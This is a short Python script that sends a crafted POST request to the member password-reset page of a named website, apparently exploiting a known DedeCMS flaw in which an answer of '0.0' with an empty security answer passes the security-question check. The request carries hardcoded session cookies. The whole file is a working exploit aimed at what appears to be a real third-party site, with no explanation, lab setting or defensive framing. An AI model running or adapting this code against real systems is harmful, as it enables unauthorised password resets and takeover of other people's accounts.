import requests



if __name__ == '__main__':
    "dopost=safequestion&safequestion=0.0&safeanswer=&id=1"
    params = {"dopost":"safequestion","safequestion":"0.0","safeanswer":"","id":1}
    headers = {"Cookie":"DedeLoginTime=1598253211; DedeLoginTime__ckMd5=72e908194edc8fd4; DedeUserID=0000001; DedeUserID__ckMd5=46daf687587cb5ff; last_vid=0000001; last_vid__ckMd5=46daf687587cb5ff; last_vtime=1598253245; last_vtime__ckMd5=d155bd6311b8b9cd; PHPSESSID=d5p4oa63v0eq2shehn9ot2fks7"}
    a = requests.post(url="http://www.gzssb.com/member/resetpassword.php",params=params, headers=headers)
    print(a.text)